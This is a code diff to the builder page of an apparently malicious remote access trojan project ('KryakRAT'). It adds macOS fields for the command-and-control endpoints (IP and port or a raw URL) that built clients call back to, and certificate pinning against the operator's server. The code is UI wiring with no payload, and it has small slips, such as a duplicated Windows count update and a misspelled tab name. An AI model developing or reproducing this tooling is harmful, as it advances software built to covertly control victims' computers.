@@ -21,10 +21,18 @@ namespace KryakRAT.Pages
         private readonly List<string> _windowsIpConnections = [];
         private readonly List<string> _windowsRawConnections = [];
 
+        private readonly ObservableCollection<ConnectionEntry> _macOSConnections = [];
+        private readonly List<string> _macOSIpConnections = [];
+        private readonly List<string> _macOSRawConnections = [];
+
         public BuilderPage()
         {
             InitializeComponent();
+
             WindowsConnectionListView.ItemsSource = _windowsConnections;
+            UpdateWindowsConnectionCount();
+
+            MacOSConnectionListView.ItemsSource = _macOSConnections;
             UpdateWindowsConnectionCount();
 
             Loaded += BuilderPage_Loaded;
@@ -65,6 +73,20 @@ namespace KryakRAT.Pages
 
             WindowsIpPortInputPanel.Visibility = rawMode ? Visibility.Collapsed : Visibility.Visible;
             WindowsRawInputPanel.Visibility = rawMode ? Visibility.Visible : Visibility.Collapsed;
+        }
+
+        private void MacOSConnectionModeRadio_Checked(object sender, RoutedEventArgs e)
+        {
+            if (MacOSIpPortInputPanel == null || MacOSRawInputPanel == null)
+            {
+                return;
+            }
+
+            bool rawMode = sender is RadioButton radio &&
+                           string.Equals(radio.Name, nameof(MacOSRawModeRadio), StringComparison.Ordinal);
+
+            MacOSIpPortInputPanel.Visibility = rawMode ? Visibility.Collapsed : Visibility.Visible;
+            MacOSRawInputPanel.Visibility = rawMode ? Visibility.Visible : Visibility.Collapsed;
         }
 
         private async void WindowsAddConnectionButton_Click(object sender, RoutedEventArgs e)
@@ -143,6 +165,82 @@ namespace KryakRAT.Pages
             UpdateWindowsConnectionCount();
         }
 
+        private async void MacOSAddConnectionButton_Click(object sender, RoutedEventArgs e)
+        {
+            string? item = null;
+            bool isRaw = MacOSRawModeRadio.IsChecked == true;
+
+            if (isRaw)
+            {
+                string raw = MacOSRawUrlTextBox.Text.Trim();
+                if (string.IsNullOrWhiteSpace(raw))
+                {
+                    await ShowSimpleDialogAsync("Warning", "Please enter a RAW URL.");
+                    return;
+                }
+
+                item = raw;
+                MacOSRawUrlTextBox.Text = string.Empty;
+            }
+            else
+            {
+                string ip = MacOSIpTextBox.Text.Trim();
+                string port = MacOSPortTextBox.Text.Trim();
+                if (string.IsNullOrWhiteSpace(ip) || string.IsNullOrWhiteSpace(port))
+                {
+                    await ShowSimpleDialogAsync("Warning", "Please enter an IP address and port.");
+                    return;
+                }
+
+                item = $"{ip}:{port}";
+                MacOSIpTextBox.Text = string.Empty;
+                MacOSPortTextBox.Text = string.Empty;
+            }
+
+            foreach (ConnectionEntry existing in _macOSConnections)
+            {
+                if (existing.IsRaw == isRaw && string.Equals(existing.Value, item, StringComparison.OrdinalIgnoreCase))
+                {
+                    await ShowSimpleDialogAsync("Warning", "This connection has already been added.");
+                    return;
+                }
+            }
+
+            _macOSConnections.Add(new ConnectionEntry(item, isRaw));
+
+            if (isRaw)
+            {
+                _macOSRawConnections.Add(item);
+            }
+            else
+            {
+                _macOSIpConnections.Add(item);
+            }
+
+            UpdateMacOSConnectionCount();
+        }
+
+        private void MacOSRemoveConnectionButton_Click(object sender, RoutedEventArgs e)
+        {
+            if (sender is not Button button || button.Tag is not ConnectionEntry entry)
+            {
+                return;
+            }
+
+            _macOSConnections.Remove(entry);
+
+            if (entry.IsRaw)
+            {
+                _macOSRawConnections.Remove(entry.Value);
+            }
+            else
+            {
+                _macOSIpConnections.Remove(entry.Value);
+            }
+
+            UpdateMacOSConnectionCount();
+        }
+
         private void WindowsCustomIconCheckBox_Checked(object sender, RoutedEventArgs e)
         {
             WindowsIconPathTextBox.IsEnabled = true;
@@ -193,8 +291,18 @@ namespace KryakRAT.Pages
         {
             WindowsPinnedOptionsPanel.Visibility = Visibility.Collapsed;
         }
+        private void MacOSPinnedModeRadio_Checked(object sender, RoutedEventArgs e)
+        {
+            MacOSPinnedOptionsPanel.Visibility = Visibility.Visible;
+            UpdateTrustButtonState();
+        }
 
-        private void TrustCurrentCertificateButton_Click(object sender, RoutedEventArgs e)
+        private void MacOSPinnedModeRadio_Unchecked(object sender, RoutedEventArgs e)
+        {
+            MacOSPinnedOptionsPanel.Visibility = Visibility.Collapsed;
+        }
+
+        private void WindowsTrustCurrentCertificateButton_Click(object sender, RoutedEventArgs e)
         {
             if (!App.Server.IsRunning)
             {
@@ -202,6 +310,16 @@ namespace KryakRAT.Pages
             }
 
             WindowsFingerprintTextBox.Text = App.Server.CurrentCertificateFingerprint;
+        }
+
+        private void MacOSTrustCurrentCertificateButton_Click(object sender, RoutedEventArgs e)
+        {
+            if (!App.Server.IsRunning)
+            {
+                return;
+            }
+
+            MacOSFingerprintTextBox.Text = App.Server.CurrentCertificateFingerprint;
         }
 
         private async void WindowsBrowseIconButton_Click(object sender, RoutedEventArgs e)
@@ -233,9 +351,17 @@ namespace KryakRAT.Pages
                 : $"Endpoints: {_windowsConnections.Count} (IP: {_windowsIpConnections.Count}, Raw: {_windowsRawConnections.Count})";
         }
 
+        private void UpdateMacOSConnectionCount()
+        {
+            MacOSConnectionCountText.Text = _macOSConnections.Count == 0
+                ? "No endpoints added"
+                : $"Endpoints: {_macOSConnections.Count} (IP: {_macOSIpConnections.Count}, Raw: {_macOSRawConnections.Count})";
+        }
+
         private void UpdateTrustButtonState()
         {
             WindowsTrustCurrentCertificateButton.IsEnabled = App.Server.IsRunning && WindowsPinnedModeRadio.IsChecked == true;
+            MacOSTrustCurrentCertificateButton.IsEnabled = App.Server.IsRunning && MacOSPinnedModeRadio.IsChecked == true;
         }
 
         private async void BuildButton_Click(object sender, RoutedEventArgs e)
@@ -470,6 +596,10 @@ namespace KryakRAT.Pages
                 {
                     BuildButton.IsEnabled = true;
                 }
+            }
+            else if (BuiderTabView.SelectedIndex == 1) // macOS
+            {
+                await ShowSimpleDialogAsync("Not Implemented", "macOS client building is not implemented yet.");
             }
         }
 
